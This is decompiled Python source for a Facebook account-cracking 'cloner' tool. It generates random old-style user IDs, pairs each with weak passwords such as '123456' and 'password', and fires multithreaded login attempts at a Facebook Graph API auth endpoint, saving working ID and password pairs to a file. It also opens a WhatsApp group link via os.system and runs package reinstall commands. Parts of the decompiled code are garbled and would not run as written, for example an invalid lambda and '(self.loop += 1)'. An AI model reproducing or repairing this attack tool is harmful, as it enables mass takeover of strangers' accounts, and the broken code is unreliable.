# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —

import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor
import requests
import bs4
import json
import os
import sys
import uuid
import random
import datetime
import time
import re
import httpx
import urllib3
import rich
import base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import marshal
import string
import bs4
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import os
import sys
import time
import re
import uuid
import base64
import zlib
import subprocess
from concurrent.futures import ThreadPoolExecutor as tpe
import pycurl
from io import BytesIO
import pycurl
import pycurl
import random
os.system('xdg-open https://chat.whatsapp.com/GjKY8C8AMhNJLwhKzCBQtr')

class OLD_CLONER:
    
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []

    
    def banner(self):
        os.system('clear')
        print('\r\r\x1b[38;5;31m    < CREATED  BY LOSSER >')
        print('              \r\r\x1b[38;5;37m        <  V/0.4 >\r\r\x1b[38;5;30m ')
        print('-------------------------------')

    
    def main(self):
        self.banner()
        print('1 -> 2009 IDS CLONE')
        print('2 -> 2010 IDS CLONE')
        print('-------------------------------')
        select = input('SELECT OPTION : ')
        if select == '1':
            self.oldClone('2009')
            return None
        if select == '2':
            self.oldClone('2010')
            return None
        self.main()

    
    def oldClone(self, series):
        self.banner()
        if series == '2009':
            self.uX = '100000'
            self.uG = 9
        if series == '2010':
            self.uX = '10000'
            self.uG = 10
        self.uX = '1000000000'
        self.uG = 9
        print('EXAMPLE  - 5000,10000')
        limit = int(input('SELECT   - '))
        for a in range(limit):
            LOSSER = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(self.uG)())
            self.gen.append(LOSSER)
            Mr_Code = ThreadPoolExecutor(max_workers = 50)
            self.banner()
            print('  [√]  TOTAL IDS - ' + str(len(self.gen)))
            print('  [√]  UID SERIES - ' + series)
            print('  [√]  IF NO RESULT USE FLIGHT MODE')
            print('-------------------------------')
            for love in self.gen:
                ids = self.uX + love
                passlist = [
                    '123456',
                    '1234567',
                    '12345678',
                    '123456789',
                    '123123',
                    '112233',
                    '1234567890',
                    'password',
                    '@@@###']
                Mr_Code.submit(self.CloneOld, ids, passlist)
                None(None, None)
                sys.exit('\n-------------------------------')
                return None
                if not ''.join:
                    pass

    
    def ugen(self):
        ua_list = [
            '[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/ru_RU;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/NEO-L29;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2139;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
            'Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 [FBAN/FB4A;FBAV/246.0.0.49.121;FBPN/com.facebook.katana;FBLC/en_US;FBBV/238093484;FBCR/;FBMF/Google;FBBD/Pixel;FBDV/Pixel 4a;FBSV/13;FBCA/arm64-v8a:;FBDM/{density=3.0,width=1440,height=2960};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 [FBAN/FB4A;FBAV/210.0.0.41.110;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/123456789;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A356B;FBSV/14;FBCA/arm64-v8a:;FBDM/{density=2.0,width=1080,height=1920};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/FB4A;FBAV/220.0.0.43.121;FBPN/com.facebook.katana;FBLC/en_US;FBBV/234578937;FBCR/Verizon;FBMF/Xiaomi;FBBD/Redmi;FBDV/2014011;FBSV/4.4.4;FBCA/arm64-v8a:;FBDM/{density=2.75,width=1080,height=2160};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 7.0; Samsung Galaxy S7 Edge) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 [FBAN/FB4A;FBAV/185.0.0.38.107;FBPN/com.facebook.katana;FBLC/en_US;FBBV/103525509;FBCR/Sprint;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A7100;FBSV/7.1.1;FBCA/arm64-v8a:;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]Mozilla/5.0 (Linux; Android 13; 23106RN0DA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-A346N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Whale/2.10.2.2 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0',
            'Mozilla/5.0 (Linux; U; Android 13; en-US; M2101K7BI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; U; Android 13; CPH2591 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.86 Mobile Safari/537.36 OPR/84.0.2254.73823',
            'Mozilla/5.0 (Linux; Android 13; SM-A346N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Whale/2.10.2.2 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; RMX3301 Build/SKQ1.221119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.107 Mobile Safari/537.36 OPX/2.5',
            'Mozilla/5.0 (Linux; Android 13; 23028RNCAG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36']
        max = random.choice(ua_list)
        return str(max)

    
    def CloneOld(self, ids, passlist):
        sys.stdout.write(f'''\r\r\x1b[m [LOSSER-XD] {self.loop}|OK:{len(self.oks)}''')
        sys.stdout.flush()
        for pas in passlist:
            data = {
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
            head = {
                'x-fb-http-engine': 'Liger' }
            url = 'https://b-graph.facebook.com/auth/login'
            response = requests.post(url, data = data, headers = head, verify = True).json()
            if 'access_token' in response:
                print(f'''\r\r\x1b[38;5;46mLOSSER-OK • {ids} • {pas}''')
                open('/sdcard/LOSSER-OLD-OK.txt', 'a').write(ids + '|' + pas + '\n')
                self.oks.append(ids)
                'gzip, deflate'
            if 'www.facebook.com' in response['error']['message']:
                print(f'''\r\r\x1b[38;5;46mLOSSER-OK • {ids} • {pas}''')
                open('/sdcard/LOSSER-OLD-OK.txt', 'a').write(ids + '|' + pas + '\n')
                self.cps.append(ids)
                'accept-encoding'
        (self.loop += 1).loop = 'graphservice'
        return None
        if Exception:
            e = 'X-FB-Request-Analytics-Tags'
            e = None
            del e
            return None
            e = None
            del e


if __name__ == '__main__':
    OLD_CLONER().main()
    return None
return None
if ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python LOSSER.py')
os.system('pip install pycurl')
import pycurl
from io import BytesIO
os.system('pkg uninstall python;pkg install python -y;pip install pycurl')
print('\n Pycurl Module Error!\n Contact With Owner! ')
exit()
